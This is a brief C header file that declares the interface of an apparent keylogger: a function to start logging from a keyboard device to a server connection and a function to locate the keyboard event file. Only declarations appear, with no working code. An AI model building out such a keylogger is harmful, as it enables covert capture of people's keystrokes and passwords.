#ifndef KEYLOGGER
#define KEYLOGGER

#define MAX_EVENTS 100

void startKeylogger(int keyboard, int server);
int findKeyboardEventFile();

#endif